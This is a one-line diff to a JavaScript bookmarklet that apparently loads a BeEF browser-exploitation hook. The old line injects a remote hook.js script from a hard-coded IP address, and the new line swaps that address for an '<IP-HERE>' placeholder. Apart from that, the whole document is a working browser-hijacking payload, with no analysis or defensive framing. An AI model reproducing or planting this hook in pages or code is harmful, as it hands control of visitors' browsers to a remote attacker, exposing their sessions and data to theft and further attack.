@@ -1,1 +1,1 @@
-javascript: (function () { var url = 'http://186.235.59.174/hook.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();
+javascript: (function () { var url = 'http://<IP-HERE>/hook.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();
